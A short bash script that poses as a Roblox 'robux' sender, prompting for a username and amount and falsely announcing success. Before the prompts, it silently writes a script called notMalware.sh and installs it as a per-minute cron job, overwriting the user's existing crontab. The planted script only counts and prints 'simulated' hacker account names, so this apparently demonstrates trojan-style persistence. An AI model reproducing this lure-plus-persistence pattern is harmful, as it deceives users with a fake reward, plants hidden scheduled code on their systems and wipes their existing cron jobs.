#!/bin/bash

SCRIPT_PATH="/home/username/notMalware.sh"

cat << 'EOF' > "$SCRIPT_PATH"
#!/bin/bash

COUNTER_FILE="/home/username/counter.txt"

if [ ! -f "$COUNTER_FILE" ]; then
    echo 0 > "$COUNTER_FILE"
fi

counter=$(cat "$COUNTER_FILE")
counter=$((counter + 1))

echo "Simulated user creation: hacker$counter"
echo $counter > "$COUNTER_FILE"
EOF

chmod +x "$SCRIPT_PATH"

echo "* * * * * /home/username/notMalware.sh" | crontab -

echo -n "Enter your roblox username: "
read username
echo -n "Enter how many robux you want: "
read robux
echo "Robux sent successfully!"
